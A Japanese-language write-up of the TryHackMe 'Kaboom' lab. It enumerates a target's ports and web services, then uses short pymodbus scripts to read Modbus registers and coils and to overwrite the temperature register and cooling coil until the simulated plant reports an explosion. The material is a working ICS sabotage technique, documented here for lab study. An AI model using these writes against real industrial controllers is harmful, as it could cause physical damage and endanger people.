# Kaboom CTF

https://tryhackme.com/room/kaboom

## Enumeration

```shell
TARGET=10.144.160.197
sudo bash -c "echo $TARGET   kaboom.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
1880/tcp open  vsat-control syn-ack ttl 64
8080/tcp open  http-proxy   syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,1880,8080 $TARGET

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          Werkzeug/3.1.3 Python/3.12.3
1880/tcp open  vsat-control?
8080/tcp open  http-proxy    Werkzeug/2.3.7 Python/3.12.3
```

- 80：制御システムのステータス表示（Offline）
- 1880：Node-REDのログイン画面
- 8080：OpenPLC Webserver のログイン画面

1880は admin/password ではログインできなかった。  
8080は openplc/openplc ではログインできなかった。


```sh
root@ip-10-144-96-255:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.144.160.197
+ Target Hostname:    kaboom.thm
+ Target Port:        80
+ Start Time:         2026-06-26 23:28:51 (GMT0)
---------------------------------------------------------------------------
+ Server: Werkzeug/3.1.3 Python/3.12.3
+ Server leaks inodes via ETags, header found with file /, inode: 0x1750190255.235032, size: 0x3747, mtime: 0x3272805344
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-disposition' found, with contents: inline; filename=index.html
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-06-26 23:28:55 (GMT0) (4 seconds)
---------------------------------------------------------------------------
```

### /api

http://kaboom.thm/api/state にアクセスしたら下記トレースが表示された。

```
ConnectionException
pymodbus.exceptions.ConnectionException: Modbus Error: [Connection] Failed to connect[ModbusTcpClient localhost:502]
```

まず、502ポートを開く必要がある。

/api/state 以外のエンドポイントは発見できなかった。

```sh
ffuf -u http://kaboom.thm/api/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -fc 404
```

### ディレクトリ列挙

列挙では新しいものは出てこなかった。

```sh
dirsearch -u http://kaboom.thm/ -e py,txt,py.bak

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: py, txt, py.bak | HTTP method: GET | Threads: 25 | Wordlist size: 10507

Output File: /root/reports/http_kaboom.thm/__26-06-27_00-10-35.txt

Target: http://kaboom.thm/

[00:10:35] Starting: 
[00:11:00] 400 -  167B  - /console
[00:11:42] 200 -  574KB - /video
```

502ポートを開く方法が分からない。

翌日ポートスキャンからやり直したら普通に開いていた・・・

```sh
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 64
80/tcp    open  http         syn-ack ttl 64
102/tcp   open  iso-tsap     syn-ack ttl 64
502/tcp   open  mbap         syn-ack ttl 64
1880/tcp  open  vsat-control syn-ack ttl 64
8080/tcp  open  http-proxy   syn-ack ttl 64
44818/tcp open  EtherNetIP-2 syn-ack ttl 64
```

## 制御システム

readしてみる。

```python
```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
    rr = client.read_holding_registers(0, 16)
    print(rr.registers)
    time.sleep(1)
```

下記の値。このとき、Web上のステータス表示は `Status: Cooling OFF, Low Temperature` となっている。

```sh
$ python ./read.py $TARGET    
[52, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
```

先頭を500にすると、`Status: High Temperature, Cooling ON` という表示に変わった。  
値は時間とともに下がっているので温度を表している。

```sh
$ python write.py $TARGET 0 500
```

```sh
[499, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
```

コイルも表示。

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
    # register
    rr = client.read_holding_registers(0, 20)
    print(rr.registers)

    # coil
    rc = client.read_coils(0, 20)
    print(rc.bits)

    time.sleep(1)
```

index 15のコイルがTrueになっていることがわかる。おそらくこれが Cooling の ON/OFF に対応している。

```sh
$ python ./read-coil.py $TARGET
[65161, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
[False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, True, False, False, False, False, False, False, False, False]
```

温度を最大値にして、Cooling を OFF にする。

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(0, 65535)
  client.write_coil(15, False)
```

`Status: Explosion Detected!` となり、フラグが表示された。

## 振り返り

- 初日に 502ポートが開かなかった原因は不明だがルームの欠陥と思われる。
- 過去の同類の問題ではレジスターだけが対象だったが、コイルを読み書きするパターンは今回が初めてで良い学びになった。

## Tags

#tags:modbus
